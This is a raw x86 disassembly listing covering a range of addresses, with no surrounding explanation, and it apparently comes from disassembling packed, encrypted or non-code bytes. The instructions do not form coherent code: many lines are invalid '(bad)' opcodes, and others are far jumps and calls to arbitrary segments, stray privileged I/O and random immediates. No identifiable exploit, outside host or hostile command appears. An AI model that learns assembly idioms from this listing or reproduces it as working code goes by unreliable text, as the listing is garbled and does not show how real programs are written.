  41b66d:	imul   edi,DWORD PTR [edx+ebx*1+0x3b],0x19
  41b672:	gs xor al,0xdf
  41b675:	mov    bh,0xd4
  41b677:	pop    edi
  41b678:	fucompp 
  41b67a:	and    eax,0x96314476
  41b67f:	cmp    al,0x9a
  41b681:	adc    cl,BYTE PTR [ebp-0x55]
  41b684:	rep lods al,BYTE PTR ds:[esi]
  41b686:	adc    al,0xf4
  41b688:	paddsw mm7,mm1
  41b68b:	or     DWORD PTR [edx+0x4],eax
  41b68e:	and    ecx,DWORD PTR [ebx-0x79]
  41b691:	mov    eax,ds:0xa3fc14dd
  41b696:	(bad)  
  41b698:	and    DWORD PTR [esi-0x59f2ba53],edx
  41b69e:	sbb    BYTE PTR [esi+0x47],0xe3
  41b6a2:	dec    ebx
  41b6a3:	sbb    eax,0x3d48d637
  41b6a8:	and    eax,0x8d163cea
  41b6ad:	stos   BYTE PTR es:[edi],al
  41b6ae:	nop
  41b6af:	addr16 std 
  41b6b1:	leave  
  41b6b2:	dec    edx
  41b6b3:	neg    DWORD PTR [eax+edi*4]
  41b6b6:	push   eax
  41b6b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6b8:	loopne 0x41b650
  41b6ba:	retf   0xd995
  41b6bd:	push   ecx
  41b6be:	cmp    DWORD PTR [esi+0x4c72f17d],0xffffffa4
  41b6c5:	ja     0x41b696
  41b6c7:	or     eax,0x2d71dc8d
  41b6cc:	and    al,0xb4
  41b6ce:	lods   al,BYTE PTR ds:[esi]
  41b6cf:	(bad)  [eax+0x175557dc]
  41b6d5:	aaa    
  41b6d6:	pushf  
  41b6d7:	mov    eax,ds:0xac832b5c
  41b6dc:	xchg   DWORD PTR [ebx],ebp
  41b6de:	popa   
  41b6df:	mov    gs,WORD PTR [ebx+eax*2-0x6]
  41b6e3:	pop    edi
  41b6e4:	adc    eax,0xa532d421
  41b6e9:	jb     0x41b6b1
  41b6eb:	mov    al,0x38
  41b6ed:	or     BYTE PTR [eax-0x42],dh
  41b6f0:	imul   edx,DWORD PTR [ecx+0x1e],0xba39b447
  41b6f7:	popa   
  41b6f8:	fdivr  DWORD PTR [edi+0x2c]
  41b6fb:	hlt    
  41b6fc:	inc    edx
  41b6fd:	sbb    al,0x1c
  41b6ff:	xor    esi,DWORD PTR [eax]
  41b701:	or     al,0x34
  41b703:	pushf  
  41b704:	mov    cl,0x32
  41b706:	pop    ebp
  41b707:	enter  0xb91e,0x25
  41b70b:	mov    edi,0x227adf00
  41b710:	or     DWORD PTR [esi+0x1ddba1d7],ecx
  41b716:	push   ss
  41b717:	jecxz  0x41b76d
  41b719:	jmp    0xe1b81b4b
  41b71e:	mov    esp,0x2901e262
  41b723:	into   
  41b724:	jnp    0x41b7a5
  41b726:	(bad)  
  41b728:	dec    ebx
  41b729:	and    al,0x54
  41b72b:	retf   0xd534
  41b72e:	push   es
  41b72f:	xchg   ebx,eax
  41b730:	les    eax,FWORD PTR [esp+eax*4-0x2a]
  41b734:	cmp    al,0x50
  41b736:	mov    edx,0x947908a
  41b73b:	jno    0x41b760
  41b73d:	xor    dh,BYTE PTR [esi]
  41b73f:	je     0x41b72a
  41b741:	(bad)  
  41b742:	test   BYTE PTR [edi+eax*1],0x19
  41b746:	adc    al,0xb3
  41b748:	xchg   edi,eax
  41b749:	ds jmp 0x1f3f2199
  41b74f:	mov    ebx,DWORD PTR [ebp+0x2d]
  41b752:	imul   ebx,esp,0xaeb2920
  41b758:	call   0xd579:0x89f0fa10
  41b75f:	sub    al,0x4
  41b761:	imul   bh
  41b763:	call   0x32ce:0x178e6a7e
  41b76a:	cmc    
  41b76b:	ret    
  41b76c:	fst    QWORD PTR [eax-0x2f6d9304]
  41b772:	push   edi
  41b773:	and    bl,BYTE PTR [edx-0x31051588]
  41b779:	jns    0x41b716
  41b77b:	jno    0x41b768
  41b77d:	add    al,0x22
  41b77f:	cmp    BYTE PTR [ebx+0x26c31d01],bl
  41b785:	push   esp
  41b786:	arpl   WORD PTR [edx+0x1138c20f],bp
  41b78c:	or     DWORD PTR [esi-0x3d],esi
  41b78f:	sbb    bh,dl
  41b791:	push   0x6b
  41b793:	jbe    0x41b779
  41b795:	iret   
  41b796:	jmp    0xde2069f4
  41b79b:	jge    0x41b7e3
  41b79d:	loope  0x41b7f5
  41b79f:	out    0x78,eax
  41b7a1:	push   esi
  41b7a2:	mov    ch,cl
  41b7a4:	or     DWORD PTR [ecx],ebx
  41b7a6:	cmp    eax,0x7a7a6d9
  41b7ab:	scas   al,BYTE PTR es:[edi]
  41b7ac:	bound  edi,QWORD PTR [ebx]
  41b7ae:	sub    al,0x28
  41b7b1:	in     eax,0xe7
  41b7b3:	jle    0x41b789
  41b7b5:	sub    eax,0x3c419b49
  41b7ba:	loop   0x41b755
  41b7bc:	mov    ecx,ds
  41b7be:	dec    edx
  41b7bf:	mov    dh,0x54
  41b7c1:	sbb    esp,DWORD PTR [ebp+0x4d]
  41b7c4:	stos   BYTE PTR es:[edi],al
  41b7c5:	mov    bl,0x2f
  41b7c7:	popf   
  41b7c8:	add    bl,BYTE PTR [edx]
  41b7ca:	cmp    DWORD PTR [edi-0xf],ebx
  41b7cd:	jo     0x41b7f4
  41b7cf:	mov    dl,0x37
  41b7d1:	loopne 0x41b77c
  41b7d3:	sbb    ebp,DWORD PTR [eax+0x6d80aae7]
  41b7d9:	add    DWORD PTR [ecx],ebp
  41b7db:	pop    eax
  41b7dc:	inc    esi
  41b7dd:	dec    ebp
  41b7de:	aaa    
  41b7df:	sbb    BYTE PTR [esi+0x23],0xb6
  41b7e3:	sub    DWORD PTR [ebp-0x5b],edi
  41b7e6:	sar    dl,0xbf
  41b7e9:	mov    ds:0xcd57d936,eax
  41b7ee:	repnz out dx,al
  41b7f0:	jmp    0xfd1c:0x2426f471
  41b7f7:	push   eax
  41b7f8:	out    dx,al
  41b7f9:	mov    ebx,0x35876417
  41b7fe:	shr    DWORD PTR [eax+edi*1+0x30a38a87],0x70
  41b806:	test   eax,0x7ef584b2
  41b80b:	mov    eax,ds:0x3d23a53b
  41b810:	inc    ebx
  41b811:	xchg   DWORD PTR [ebp+0x13],esi
  41b814:	fcom   QWORD PTR [ebp-0x2c]
  41b817:	xor    al,0xb3
  41b819:	popf   
  41b81a:	pushf  
  41b81b:	xchg   ecx,eax
  41b81c:	mov    ebp,0xf2efbc6f
  41b821:	mov    ebp,ebx
  41b823:	add    DWORD PTR [ecx+0x68e08e08],ebp
  41b829:	push   ss
  41b82a:	xlat   BYTE PTR ds:[ebx]
  41b82b:	push   ebx
  41b82c:	cmp    BYTE PTR [esi+0x15],0x6a
  41b830:	sbb    bh,BYTE PTR ds:0x8985cfb5
  41b836:	or     al,BYTE PTR [ebx-0x3edd8e6a]
  41b83c:	push   esi
  41b83d:	and    BYTE PTR [esi+0x6e],dl
  41b840:	jmp    0x2538e79a
  41b845:	not    BYTE PTR [edx-0x7]
  41b848:	dec    eax
  41b849:	std    
  41b84a:	daa    
  41b84b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b84c:	dec    edx
  41b84d:	jp     0x41b88e
  41b84f:	bt     DWORD PTR [edi],eax
  41b852:	ins    BYTE PTR es:[edi],dx
  41b853:	jns    0x41b8bc
  41b855:	pop    ebp
  41b856:	or     al,0x85
  41b858:	push   esp
  41b859:	je     0x41b8ad
  41b85b:	out    dx,al
  41b85c:	imul   BYTE PTR [edx]
  41b85e:	jmp    0x93f1:0x681279a
  41b865:	dec    edx
  41b866:	pop    esp
  41b867:	jmp    0xdcde:0x4d6aeee6
  41b86e:	loop   0x41b828
  41b870:	cmp    edi,DWORD PTR [edx+0x6d740bb2]
  41b876:	jne    0x41b8d0
  41b878:	or     al,0x9c
  41b87a:	into   
  41b87b:	adc    ah,BYTE PTR [edi-0x5a7fe943]
  41b881:	bnd jge 0x41b87a
  41b884:	shl    DWORD PTR [esi+0x615e8bdc],0x6d
  41b88b:	mov    ecx,0x67f0bc45
  41b890:	sub    bl,0x8b
  41b893:	mov    esi,0x96db02fb
  41b898:	mov    edx,0x5e96ef9a
  41b89d:	push   ebx
  41b89e:	xor    al,0xf5
  41b8a0:	or     DWORD PTR [ebp-0x33],edx
  41b8a3:	fyl2xp1 
  41b8a5:	mov    esi,ebp
  41b8a7:	xchg   edi,eax
  41b8a8:	xor    dh,BYTE PTR [bp+si]
  41b8ab:	and    DWORD PTR [ebp*4+0x2c14f4b],eax
  41b8b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8b3:	sbb    ebp,ebx
  41b8b5:	fcomp  QWORD PTR [ebp+edi*2+0x4a213164]
  41b8bc:	fs push ds
  41b8be:	sub    bl,BYTE PTR [esi]
  41b8c0:	test   eax,0xc7ea6f81
  41b8c5:	scas   al,BYTE PTR es:[edi]
  41b8c6:	test   eax,0xc36430ab
  41b8cb:	cmp    eax,0xc9f42faf
  41b8d0:	and    DWORD PTR [edi+ebx*8-0x39],eax
  41b8d4:	lods   eax,DWORD PTR ds:[esi]
  41b8d5:	push   eax
  41b8d6:	test   al,0x3e
  41b8d8:	adc    al,0x6c
  41b8da:	mov    ds:0xa6977c49,eax
  41b8df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8e1:	or     eax,0x8d99a8ed
  41b8e6:	xchg   ebp,eax
  41b8e7:	mov    al,0xa6
  41b8e9:	sbb    ch,BYTE PTR [ebp+0x1a09a1fd]
  41b8ef:	out    0x8e,al
  41b8f1:	pop    ebp
  41b8f2:	sbb    cl,0xda
  41b8f5:	jge    0x41b8c1
  41b8f7:	icebp  
  41b8f8:	push   ecx
  41b8fa:	and    al,0x7a
  41b8fc:	push   es
  41b8fd:	and    DWORD PTR [ebx-0x18],ebp
  41b900:	sbb    al,0x25
  41b902:	push   esi
  41b903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b904:	push   ds
  41b905:	(bad)  
  41b906:	neg    DWORD PTR ds:0x3294381d
  41b90c:	fucom  st(2)
  41b90e:	pop    ebx
  41b90f:	adc    DWORD PTR [ebp+0x53],esi
  41b912:	pop    ecx
  41b913:	scas   al,BYTE PTR es:[edi]
  41b914:	scas   eax,DWORD PTR es:[edi]
  41b915:	push   cs
  41b916:	scas   eax,DWORD PTR es:[edi]
  41b917:	push   eax
	...
  41b920:	add    BYTE PTR ds:0x7fd60e68,dl
  41b926:	neg    ch
  41b928:	jmp    0x41b991
  41b92a:	cli    
  41b92b:	and    BYTE PTR [esi+0x27],ah
  41b92e:	nop
  41b92f:	(bad)  
  41b930:	jmp    0x3af:0x1362e
  41b937:	add    BYTE PTR [eax],al
  41b939:	cdq    
  41b93a:	push   eax
  41b93b:	push   eax
  41b93c:	push   edi
  41b93d:	xchg   edi,eax
  41b93e:	fild   WORD PTR [ecx]
  41b940:	cli    
  41b941:	mov    edx,0x846f98f9
  41b946:	mov    ds:0x569226e2,al
  41b94b:	mov    dh,ch
  41b94d:	cwde   
  41b94e:	sar    BYTE PTR [ecx+0x6df02e2f],cl
  41b954:	add    esi,ecx
  41b956:	and    ebp,eax
  41b958:	push   edx
  41b959:	dec    edx
  41b95a:	xor    al,0x53
  41b95c:	push   ebp
  41b95d:	inc    edi
  41b95e:	add    BYTE PTR [ebp-0x28],0xda
  41b962:	mov    esi,0x7971a3e0
  41b967:	cmp    eax,0x7872c017
  41b96c:	or     cl,BYTE PTR [ebx-0x64]
  41b96f:	pop    es
  41b970:	test   ebp,esi
  41b972:	and    edi,DWORD PTR [edi+0x20]
  41b975:	ins    BYTE PTR es:[edi],dx
  41b976:	int3   
  41b977:	cmp    BYTE PTR [ecx],al
  41b979:	adc    al,0x8d
  41b97b:	push   eax
  41b97c:	cmp    DWORD PTR [ebx+edx*2],esp
  41b97f:	out    dx,eax
  41b980:	adc    ch,bh
  41b982:	push   ebp
  41b983:	jns    0x41b92e
  41b985:	mov    ch,0x6a
  41b987:	adc    eax,0x1b48b730
  41b98c:	retf   0x67cd
  41b98f:	popf   
  41b990:	into   
  41b991:	mov    eax,0x6c773ca0
  41b996:	xchg   esp,eax
  41b997:	cmp    al,0x28
  41b999:	loope  0x41b9da
  41b99b:	ret    
  41b99c:	arpl   WORD PTR [edi],di
  41b99e:	xchg   BYTE PTR [edx],dh
  41b9a0:	aas    
  41b9a1:	adc    ah,BYTE PTR [ecx-0x4b]
  41b9a4:	scas   eax,DWORD PTR es:[edi]
  41b9a5:	mov    ?,WORD PTR [ebx-0x23]
  41b9a8:	jbe    0x41b9a6
  41b9aa:	xor    BYTE PTR [ebx-0x64],bh
  41b9ad:	xor    dh,BYTE PTR [ebp-0x53]
  41b9b0:	cvtps2pd xmm1,QWORD PTR [edx]
  41b9b3:	sbb    DWORD PTR [eax+0x496c24e3],edx
  41b9b9:	jae    0x41ba02
  41b9bb:	cmp    edi,edx
  41b9bd:	cmp    cl,cl
  41b9bf:	add    DWORD PTR [ecx],edx
  41b9c1:	jb     0x41b997
  41b9c3:	in     al,0x83
  41b9c5:	stos   DWORD PTR es:[edi],eax
  41b9c6:	inc    edi
  41b9c7:	dec    ebp
  41b9c8:	in     al,0xb
  41b9ca:	sbb    al,0x4f
  41b9cc:	jmp    0x41ba34
  41b9ce:	dec    esp
  41b9cf:	(bad)  
  41b9d0:	xlat   BYTE PTR ds:[ebx]
  41b9d1:	fld    TBYTE PTR [ecx]
  41b9d3:	xchg   edx,eax
  41b9d4:	mov    bl,0x32
  41b9d6:	cmp    eax,esp
  41b9d8:	into   
  41b9d9:	sti    
  41b9da:	adc    al,0x99
  41b9dc:	inc    eax
  41b9dd:	into   
  41b9de:	add    eax,0x8064b865
  41b9e3:	or     al,0xdb
  41b9e5:	cmc    
  41b9e6:	outs   dx,BYTE PTR ds:[esi]
  41b9e7:	jae    0x41b9e6
  41b9e9:	mov    edi,ebx
  41b9eb:	rcr    DWORD PTR [esi],0xef
  41b9ee:	lods   eax,DWORD PTR ds:[esi]
  41b9ef:	ret    
  41b9f0:	dec    ebx
  41b9f1:	push   ss
  41b9f2:	jle    0x41b9e1
  41b9f4:	mov    ds:0xfd41f101,eax
  41b9f9:	mov    ds:0x1c0ef109,al
  41b9fe:	inc    BYTE PTR [ecx]
  41ba00:	inc    eax
  41ba01:	mov    al,ds:0x82fc287b
  41ba06:	push   es
  41ba07:	ins    BYTE PTR es:[edi],dx
  41ba08:	pop    DWORD PTR [eax]
  41ba0a:	mov    ebx,DWORD PTR [eax+0x2c]
  41ba0d:	jmp    0xe4d26487
  41ba12:	jmp    0x41ba34
  41ba14:	pop    DWORD PTR [eax-0x2ee48442]
  41ba1a:	inc    edi
  41ba1b:	push   edi
  41ba1c:	adc    al,0xbf
  41ba1e:	pushf  
  41ba1f:	out    0x18,al
  41ba21:	fnop   
  41ba23:	pop    esi
  41ba24:	sub    eax,0x14c05255
  41ba29:	push   esp
  41ba2a:	pop    es
  41ba2b:	push   eax
  41ba2c:	sub    BYTE PTR [ecx+0x6f39af89],dh
  41ba32:	or     al,0xee
  41ba34:	dec    ah
  41ba36:	jl     0x41ba3e
  41ba38:	pop    ds
  41ba39:	adc    bl,BYTE PTR [ebx-0x1c09c44b]
  41ba3f:	rol    edx,cl
  41ba41:	ret    
  41ba42:	das    
  41ba43:	cmp    dh,BYTE PTR [edx+0x7e36ce08]
  41ba49:	add    DWORD PTR [edx-0x43],ebp
  41ba4c:	or     BYTE PTR [ebx],ch
  41ba4e:	stos   WORD PTR es:[edi],ax
  41ba50:	fisubr WORD PTR ds:0xaf1ba90e
  41ba56:	mov    esp,0xfa3548bd
  41ba5b:	push   0xaaf8f8ea
  41ba60:	fstp   st(3)
  41ba62:	es mov esi,0x8f82a3da
  41ba68:	pop    ebx
  41ba69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba6a:	repnz xchg esp,eax
  41ba6c:	into   
  41ba6d:	jb     0x41baaa
  41ba6f:	jmp    0x9f2a:0xef4824b7
  41ba76:	mov    ebx,ebx
  41ba78:	mov    WORD PTR [ecx],ss
  41ba7a:	in     al,dx
  41ba7b:	jbe    0x41ba0d
  41ba7d:	out    dx,eax
  41ba7e:	push   0xf4d06c60
  41ba83:	dec    edx
  41ba84:	and    al,0x64
  41ba86:	adc    eax,DWORD PTR [esi-0x1cc9a7e7]
  41ba8c:	idiv   edi
  41ba8e:	sub    ecx,DWORD PTR [eax-0x7220cc34]
  41ba94:	imul   ebp,DWORD PTR [eax-0x4bc19283],0xffffff8b
  41ba9b:	retf   
  41ba9c:	fsubr  DWORD PTR [esi+0x29]
  41ba9f:	or     cl,dh
  41baa1:	and    eax,0x1c4f23f4
  41baa6:	push   edx
  41baa7:	out    dx,eax
  41baa8:	test   edi,ebx
  41baaa:	cmp    eax,0xa7d4c245
  41baaf:	jge    0x41ba5e
  41bab1:	sub    al,0x4a
  41bab3:	pop    edx
  41bab4:	popf   
  41bab5:	(bad)  
  41bab6:	dec    edx
  41bab7:	mov    ch,BYTE PTR [eax+0x29853105]
  41babd:	add    DWORD PTR [edx+0x2e799d77],edi
  41bac3:	xor    cl,al
  41bac5:	inc    ebx
  41bac6:	ins    BYTE PTR es:[edi],dx
  41bac7:	rcl    BYTE PTR [edx+0x4605aa8e],cl
  41bacd:	sbb    eax,0xd8db999f
  41bad2:	es fcomip st,st(7)
  41bad5:	sub    dl,BYTE PTR [edi]
  41bad7:	js     0x41bb3c
  41bad9:	jbe    0x41bb14
  41badb:	xor    BYTE PTR [ecx-0x3751c6f1],dl
  41bae1:	mov    edx,ss
  41bae3:	mov    esp,0x77505a10
  41bae8:	les    esi,FWORD PTR [ebx-0xac220b0]
  41baee:	lock push ecx
  41baf0:	int    0xef
  41baf2:	mov    ebx,ecx
  41baf4:	xlat   BYTE PTR ds:[ebx]
  41baf5:	jne    0x41bb36
  41baf7:	clc    
  41baf8:	pop    ebx
  41baf9:	sub    cl,BYTE PTR [ecx]
  41bafb:	jecxz  0x41baa6
  41bafd:	pusha  
  41bafe:	das    
  41baff:	rcl    BYTE PTR [ebp*2+0x5ff25a31],1
  41bb06:	outs   dx,BYTE PTR ds:[esi]
  41bb07:	sub    ebx,0xf378b6ee
  41bb0d:	mov    ds:0xf6aa3d7,eax
  41bb12:	push   ebx
  41bb13:	fwait
  41bb14:	or     ah,BYTE PTR [ebx]
  41bb16:	jnp    0x41bb78
  41bb18:	inc    edi
  41bb19:	jmp    0xfb62d33d
  41bb1e:	xor    DWORD PTR [ebx-0x1a],edi
  41bb21:	jb     0x41bb2a
  41bb23:	and    ah,BYTE PTR [edx+0x52]
  41bb26:	or     dl,BYTE PTR [edx]
  41bb28:	test   eax,0xb44d89f2
  41bb2d:	sbb    BYTE PTR [eax+eax*8-0x256bd80a],cl
  41bb34:	(bad)  
  41bb35:	jl     0x41bb75
  41bb37:	out    dx,al
  41bb38:	enter  0x5559,0x4d
  41bb3c:	pandn  mm1,mm0
  41bb3f:	call   0x57a0:0xde30459c
  41bb46:	shl    DWORD PTR [ebx+0x64],0x16
  41bb4a:	mov    ah,0x8a
  41bb4c:	fisub  WORD PTR [esi-0x574cb0c6]
  41bb52:	pop    ebp
  41bb53:	or     bl,dh
  41bb55:	je     0x41bb90
  41bb57:	fimul  DWORD PTR [ebp+0x38]
  41bb5a:	lea    eax,[ecx]
  41bb5c:	mov    ecx,0x22b7e721
  41bb61:	fistp  QWORD PTR [ebx]
  41bb63:	mov    dh,0xf3
  41bb65:	ins    BYTE PTR es:[edi],dx
  41bb66:	inc    ecx
  41bb67:	jmp    0x41bb35
  41bb69:	mov    bl,0x3f
  41bb6b:	jg     0x41bb6e
  41bb6d:	outs   dx,BYTE PTR ds:[esi]
  41bb6e:	rcl    DWORD PTR [eax],0x18
  41bb71:	clc    
  41bb72:	dec    edi
  41bb73:	mov    al,0xdd
  41bb75:	popf   
  41bb76:	imul   di,WORD PTR [ebx+0x3dd0dcab],0xffc1
  41bb7e:	les    ecx,FWORD PTR [ecx-0x76111fa4]
  41bb84:	call   0x185ca966
  41bb89:	loop   0x41bb53
  41bb8b:	add    al,0x93
  41bb8d:	mov    esi,0x28227c4c
  41bb92:	adc    eax,0x1e96de85
  41bb97:	js     0x41bba4
  41bb99:	fwait
  41bb9a:	xchg   ecx,eax
  41bb9b:	mov    BYTE PTR [esp+edx*1],bh
  41bb9e:	aaa    
  41bb9f:	mov    ch,0x44
  41bba1:	push   esp
  41bba2:	adc    al,0x9d
  41bba4:	pop    ebx
  41bba5:	rcl    DWORD PTR [ebx-0x27],0x49
  41bba9:	call   0xb70af302
  41bbae:	jmp    0xf252:0x28eeb3b
  41bbb5:	ja     0x41bc04
  41bbb7:	add    BYTE PTR [ecx],0x13
  41bbba:	sbb    edi,DWORD PTR [esi]
  41bbbc:	pop    edi
  41bbbd:	sbb    al,0x20
  41bbbf:	ret    
  41bbc0:	fs stos BYTE PTR es:[edi],al
  41bbc2:	add    BYTE PTR [edi+eax*1],ch
  41bbc5:	mov    cs,ebp
  41bbc7:	jns    0x41bc34
  41bbc9:	je     0x41bc20
  41bbcb:	stos   DWORD PTR es:[edi],eax
  41bbcc:	ins    DWORD PTR es:[edi],dx
  41bbcd:	sub    ax,0xd634
  41bbd1:	out    dx,eax
  41bbd2:	gs mov eax,0x8166498a
  41bbd8:	and    ebp,esi
  41bbda:	test   BYTE PTR [ebp+0x9],cl
  41bbdd:	(bad)  
  41bbde:	push   0x1
  41bbe0:	bound  esp,QWORD PTR [esi+ebx*8-0x4e]
  41bbe4:	sub    bl,BYTE PTR [ebx-0x74cd3955]
  41bbea:	call   esi
  41bbec:	xor    eax,0x36858a29
  41bbf1:	mov    bh,0xff
  41bbf3:	xchg   ecx,eax
  41bbf4:	xchg   DWORD PTR [esi+0x5],ebp
  41bbf7:	(bad)  
  41bbf8:	out    dx,eax
  41bbf9:	cmp    eax,0x41de025a
  41bbfe:	add    DWORD PTR [ebx],0xe9c5090c
  41bc04:	ret    0xa1b4
  41bc07:	xchg   ecx,eax
  41bc08:	cdq    
  41bc09:	push   ds
  41bc0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc0b:	lahf   
  41bc0c:	pop    ebx
  41bc0d:	adc    esp,DWORD PTR [ecx]
  41bc0f:	xchg   esp,eax
  41bc10:	or     BYTE PTR [esi+0x37],cl
  41bc13:	mov    ecx,0xb333fb78
  41bc18:	leave  
  41bc19:	js     0x41bbca
  41bc1b:	stos   DWORD PTR es:[edi],eax
  41bc1c:	mov    cl,0xe5
  41bc1e:	int    0xfe
  41bc20:	rol    BYTE PTR [eax-0x39635453],1
  41bc26:	(bad)  
  41bc27:	(bad)  
  41bc28:	mov    ecx,0x597ebb5
  41bc2d:	dec    edx
  41bc2e:	bound  dx,DWORD PTR [ecx]
  41bc31:	repnz ds mov esi,0x53d8ef46
  41bc38:	mov    al,ds:0xe35758f8
  41bc3d:	in     eax,dx
  41bc3e:	js     0x41bbcd
  41bc40:	push   esi
  41bc41:	inc    esp
  41bc42:	test   eax,0xfbeaad1
  41bc47:	scas   eax,DWORD PTR es:[edi]
  41bc48:	sbb    dh,cl
  41bc4a:	(bad)  
  41bc4b:	mov    dh,0x45
  41bc4d:	leave  
  41bc4e:	(bad)  
  41bc4f:	mov    ds:0x6e1bdcc,eax
  41bc54:	dec    eax
  41bc55:	arpl   WORD PTR [ebp+0x18],dx
  41bc58:	push   ebx
  41bc59:	sub    esp,DWORD PTR [ebp+0x3d4610cb]
  41bc5f:	mov    edi,0xd806c314
  41bc64:	jae    0x41bc1e
  41bc66:	push   0x2ca1b32c
  41bc6b:	and    al,0xb1
  41bc6d:	pop    edi
  41bc6e:	adc    DWORD PTR [ebx-0x79],0x559c0e77
  41bc75:	xor    DWORD PTR [edx+0x17],esp
  41bc78:	inc    edx
  41bc79:	addr16 mov al,ds:0x7283
  41bc7d:	stos   BYTE PTR es:[edi],al
  41bc7e:	dec    edx
  41bc7f:	adc    ah,BYTE PTR [edx]
  41bc81:	sti    
  41bc82:	lods   al,BYTE PTR ds:[esi]
  41bc83:	test   DWORD PTR [edi-0x77bdb3aa],edi
  41bc89:	retf   0x98bd
  41bc8c:	xchg   ebx,eax
  41bc8d:	dec    eax
  41bc8e:	cmp    dh,BYTE PTR [ecx+0x1a]
  41bc91:	push   esi
  41bc92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc93:	mov    cl,BYTE PTR [ecx+esi*1]
  41bc96:	cmp    al,0x99
  41bc98:	dec    ecx
  41bc99:	(bad)  [eax-0x60fe1451]
  41bc9f:	outs   dx,BYTE PTR ds:[esi]
  41bca0:	sbb    al,0x37
  41bca2:	cs es jae 0x41bcf0
  41bca6:	stc    
  41bca7:	cmp    eax,0x366fbcee
  41bcac:	outs   dx,DWORD PTR ds:[esi]
  41bcad:	xchg   ebx,eax
  41bcae:	dec    edi
  41bcaf:	in     al,0x36
  41bcb1:	ja     0x41bcf6
  41bcb3:	or     DWORD PTR [ebp+0x52],ebp
  41bcb6:	xchg   ebx,eax
  41bcb7:	test   DWORD PTR [ecx+ebp*4+0x68b91220],esi
  41bcbe:	fcmovnb st,st(5)
  41bcc0:	xchg   esi,eax
  41bcc1:	pop    ds
  41bcc2:	repz sbb edi,DWORD PTR [edx+0x4f]
  41bcc6:	mov    ds:0xf4bd2353,al
  41bccb:	adc    ebp,eax
  41bccd:	cdq    
  41bcce:	xlat   BYTE PTR ds:[ebx]
  41bccf:	jno    0x41bd06
  41bcd1:	push   ebx
  41bcd2:	rcl    BYTE PTR [edi+0x28],0x31
  41bcd6:	outs   dx,DWORD PTR ds:[esi]
  41bcd7:	aad    0x2c
  41bcd9:	mov    ebx,ecx
  41bcdb:	cmp    BYTE PTR [ebx+0x656007c8],dh
  41bce1:	lock test BYTE PTR [esi+0x787a74c5],ch
	...
  41bcf0:	add    ah,bh
  41bcf2:	mov    WORD PTR [ebx+edx*8-0x5000040c],?
  41bcf9:	and    al,0xd
  41bcfb:	jmp    0x41bd54
  41bcfd:	addr16 mov edi,0x39ddd23b
  41bd03:	add    DWORD PTR [eax],eax
  41bd05:	scas   eax,DWORD PTR es:[edi]
  41bd06:	add    eax,DWORD PTR [eax]
  41bd08:	add    BYTE PTR [ebp+0x17],cl
  41bd0b:	mov    ds:0x6676e3ed,eax
  41bd10:	xchg   ebx,eax
  41bd11:	shl    DWORD PTR [esp+eax*4+0x25],1
  41bd15:	mov    ebx,0x12ee7e68
  41bd1a:	xchg   ecx,eax
  41bd1b:	stc    
  41bd1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd1d:	test   DWORD PTR [ecx],esi
  41bd1f:	mov    esi,0x87ea6d97
  41bd24:	and    dl,bh
  41bd26:	popa   
  41bd27:	out    dx,al
  41bd28:	cmp    al,0x6d
  41bd2a:	(bad)  
  41bd2c:	add    DWORD PTR [ecx],edx
  41bd2e:	sub    eax,0xa9892935
  41bd33:	mov    esp,0x4f160783
  41bd38:	push   ss
  41bd39:	int    0xf1
  41bd3b:	fmul   QWORD PTR [ebx+0x2]
  41bd3e:	jo     0x41bd69
  41bd40:	call   0x7137cadb
  41bd45:	fnsave [ebx]
  41bd47:	xor    edx,DWORD PTR ds:0x6008572d
  41bd4d:	aas    
  41bd4e:	fnstenv [edi-0x25317629]
  41bd54:	fsub   QWORD PTR [edx]
  41bd56:	js     0x41bd2f
  41bd58:	addr16 cdq 
  41bd5a:	into   
  41bd5b:	gs out 0x90,eax
  41bd5e:	mov    ds:0x63fd52b4,al
  41bd63:	xchg   edx,eax
  41bd64:	and    eax,0xac2a01aa
  41bd69:	add    eax,0xa7914baa
  41bd6e:	jno    0x41bcf2
  41bd70:	sti    
  41bd71:	in     al,dx
  41bd72:	repnz dec esi
  41bd74:	inc    esi
  41bd75:	sub    BYTE PTR [eax-0x7cf95f02],bh
  41bd7b:	cmp    BYTE PTR [edx+edx*2],ah
  41bd7e:	jge    0x41bde1
  41bd80:	repnz xor DWORD PTR [esp+edi*2-0x55],edi
  41bd85:	inc    esi
  41bd86:	sub    BYTE PTR [ecx+0x5e],cl
  41bd89:	mov    edi,0x5237fd67
  41bd8e:	xor    eax,0x54f5d491
  41bd93:	pushf  
  41bd94:	cdq    
  41bd95:	imul   BYTE PTR [eax+0x42]
  41bd98:	mov    ch,0x74
  41bd9a:	mov    esp,DWORD PTR [ebx]
  41bd9c:	mov    cl,BYTE PTR [ebx+0x5632937a]
  41bda2:	mov    esi,0x3b35d266
  41bda7:	into   
  41bda8:	repz repnz fiadd DWORD PTR [esi-0x70]
  41bdad:	sub    al,0xed
  41bdaf:	ret    0xb881
  41bdb2:	jge    0x41bd3c
  41bdb4:	sbb    ch,BYTE PTR [ebx-0x3c]
  41bdb7:	loop   0x41be18
  41bdb9:	and    DWORD PTR [ebx-0x2dcdc62c],eax
  41bdbf:	stc    
  41bdc0:	outs   dx,BYTE PTR ds:[esi]
  41bdc1:	and    edi,ecx
  41bdc3:	fld    st(0)
  41bdc5:	or     al,0x5c
  41bdc7:	or     dh,dl
  41bdc9:	jge    0x41bde1
  41bdcb:	mov    ecx,0x23f96221
  41bdd0:	dec    ebp
  41bdd1:	outs   dx,BYTE PTR ds:[esi]
  41bdd2:	sbb    BYTE PTR [esi+0x7f],dl
  41bdd5:	mov    dl,0xbb
  41bdd7:	mov    ebp,0x57e00acd
  41bddc:	int    0x4d
  41bdde:	mov    edx,0x9d6197f1
  41bde3:	retf   0x9fd9
  41bde6:	inc    esi
  41bde7:	mov    ebx,0xb0b6202d
  41bdec:	shl    DWORD PTR [eax-0x2dbda32f],1
  41bdf2:	add    edi,DWORD PTR [esi-0xe]
  41bdf5:	mov    cl,0xbb
  41bdf7:	dec    eax
